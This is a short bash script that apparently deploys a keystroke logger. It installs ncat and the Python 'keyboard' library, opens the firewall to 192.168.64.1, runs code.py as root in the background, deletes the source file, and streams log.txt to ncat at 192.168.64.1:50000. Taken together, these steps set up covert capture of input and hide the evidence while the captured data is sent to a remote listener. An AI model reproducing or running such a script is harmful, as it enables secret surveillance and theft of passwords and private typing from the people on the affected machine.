#!/bin/bash
source venv/bin/activate
sudo apt-get update
sudo apt-get install -y ncat
sudo apt-get install -y ufw
sudo apt install net-tools
sudo ufw enable
sudo ufw allow 50000/tcp
sudo ufw allow out to 192.168.64.1
sudo ufw allow in from 192.168.64.1
pip install keyboard
sudo venv/bin/python3 -u code.py&
sudo rm code.py &
tail -f log.txt | ncat 192.168.64.1 50000                                      
